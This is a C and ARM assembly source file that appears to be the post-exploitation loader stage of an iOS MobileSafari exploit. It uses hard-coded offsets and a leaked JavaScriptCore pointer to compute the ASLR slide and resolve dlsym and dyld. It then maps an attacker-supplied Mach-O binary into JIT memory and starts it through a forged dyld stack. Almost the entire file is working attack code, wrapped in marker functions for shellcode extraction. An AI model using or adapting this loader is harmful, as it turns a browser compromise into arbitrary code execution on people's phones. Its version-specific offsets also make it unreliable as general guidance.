// [1] https://iokit.racing/machotricks.pdf

#include <stdio.h>
#include <stdint.h> 
#include <unistd.h>
#include <dlfcn.h>
#include <mach-o/loader.h>
#include <mach-o/swap.h>
#include <mach-o/dyld_images.h>
#include <mach/mach.h>

// targeting a specific version of os 
// on a specific device we can use hard coded
// offsets 
#define JSCELL_DESTROY 0x2e49e345
// this one was extracted at runtime, cause
// the one from the ipsw was not the same as on the phone
#define DLSYM_BASE 0x381227d0
#define DYLD_START 0x1028

#define MINU(a,b) ((unsigned)(a) < (unsigned)(b) ? a : b)

typedef void * (* dlsym_t)(void *restrict handle, const char *restrict name);
typedef int (* printf_t)(const char * format, ... );
typedef unsigned int (* sleep_t)(unsigned int seconds);
typedef int (* _fprintf)(FILE *stream, const char *format, ...);
typedef void * (* dlopen_t)(const char* path, int mode);
typedef	void * (* malloc_t)(size_t size);

typedef kern_return_t (* task_info_fn_t)(task_t target_task,
	       	int flavor, task_info_t task_info,
	       	mach_msg_type_number_t *task_info_count);

typedef mach_port_t     (* mach_task_self_t)(void);
typedef char (* strcpy_t)(char *dest, const char *src);

// @see dyldStartup.s
struct dyld_params 
{
	void *base;
	// this is set up to have only one param, 
	// binary name
	unsigned argc;
	// bin name and NULL
	void * argv[2];
	// NULL
	void * env[1];
	// NULL
	void * apple[2];
	char strings[];
};

void next(uintptr_t JSCell_destroy, void *macho, unsigned pc);

void __magic_start() {
	asm("mov r0, #0");
	asm("mov r0, #0");
	asm("mov r0, #0");
	asm("mov r0, #0");
}

// In the MobileSafari part we place two arguments
// right before the first instruction of the loader.
// Extract them and place them as next arguments
__attribute__((naked)) void start() 
{
	asm("ldr r1, [pc,#-0xC]");
	asm("ldr r0, [pc,#-0xC]");
	asm("mov r2, pc");
	asm("b _next");
}

static void __copy(void *dst, void *src, size_t n)
{
	do {
		*(char *)dst = *(char *)src;
		dst++;
		src++;
	} while (--n);
}

// We map macho file into jit memory. 
// The details are outlined in [1].
void * map_macho(void *macho, void *base) 
{
	void *macho_base = (void *)-1;
	struct mach_header *header = macho;
	union {
		struct load_command *cmd;
		struct segment_command *segment;
		void *p;
		unsigned *u32;
	} commands;

	commands.p = macho + sizeof(struct mach_header);

	// we assume that the loading address is 0
	// since we are in control of macho file
	for (int i=0; i<header->ncmds; i++) {
		// LC_SEGMENT command
		if (commands.cmd->cmd == 1) {

			if (commands.segment->filesize == 0)
				goto next_cmd;

			macho_base = MINU(macho_base, base + commands.segment->vmaddr);
			__copy(base + commands.segment->vmaddr, 
			       macho + commands.segment->fileoff,
			       commands.segment->filesize);
		}

next_cmd:
		commands.p += commands.cmd->cmdsize;
	}

	return macho_base;
}

void next(uintptr_t JSCell_destroy, void *macho, unsigned pc)
{
	// structure describing the stack layout 
	// expected by the macho loader of ios
	//
	// The detail are in dyldStartup.s file of dyld source code. 
	// https://opensource.apple.com/source/dyld/dyld-421.1/src/dyldStartup.s.auto.html
	struct dyld_params *__sp;

	// resolve functions we are going to use
	unsigned slide = JSCell_destroy - JSCELL_DESTROY;
	dlsym_t _dlsym = (dlsym_t)(DLSYM_BASE + slide + 1);
	malloc_t _malloc = _dlsym(RTLD_DEFAULT, "malloc");
	strcpy_t _strcpy = _dlsym(RTLD_DEFAULT, "strcpy");

	task_info_fn_t _task_info = _dlsym(RTLD_DEFAULT, "task_info");
	mach_task_self_t _mach_task_self = _dlsym(RTLD_DEFAULT, "mach_task_self");

	mach_port_t self = _mach_task_self();
	task_dyld_info_data_t info;
	struct dyld_all_image_infos *infos;

	// We need __dyld_start address to load a macho file,
	// We call task_info to get dyld base and use hard coded offset
	// to get __dyld_start pointer.
	mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
	kern_return_t kr = _task_info(self, TASK_DYLD_INFO, (task_info_t)&info, &count);

	infos = (struct dyld_all_image_infos *)info.all_image_info_addr;
	void *dyld = (void *)infos->dyldImageLoadAddress;
	void (* __dyld_start)() = (dyld + DYLD_START);

	// get page aligned address a bit further after
	// the loader and map the macho down there.
	void *base = (void *) (pc & ~PAGE_MASK);
	base += 0x40000;
	base = map_macho(macho, base);

	// allocate stack for out executable
	__sp = _malloc(0x800000) + 0x400000;

	// setup up our fake stack
	__sp->base = base;
	__sp->argc = 1;
	__sp->argv[0] = &__sp->strings;
	__sp->argv[1] = NULL;
	__sp->env[0] = NULL;

	__sp->apple[0] = &__sp->strings;
	__sp->apple[1] = NULL;

	// it's required to have argv[0]
	_strcpy(__sp->strings, "/bin/bin");

	// call __dyld_start 
	__asm__ ("ldr r0, %[f];"
		 "ldr r1, %[v];"
		 "mov sp, r1;"
		 "bx r0;"
		: // no output
		: [v]"m"(__sp), [f]"m"(__dyld_start)
	);
}

#if 1
void __magic_end() {
	asm("mov r0, #1");
	asm("mov r0, #1");
	asm("mov r0, #1");
	asm("mov r0, #1");
}
#endif
